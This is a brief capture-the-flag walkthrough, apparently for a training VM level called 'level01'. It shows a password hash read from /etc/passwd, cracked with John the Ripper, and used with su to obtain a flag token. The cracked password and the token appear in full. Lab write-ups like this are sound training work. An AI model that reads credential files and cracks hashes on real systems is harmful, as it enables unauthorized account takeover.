# level01

```bash
$ cat /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

[In our machine]
$ echo "flag01:42hDRfypTqqnw" > passwd
$ john passwd
abcdefg          (flag01)

$ su flag01
Password: abcdefg
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```
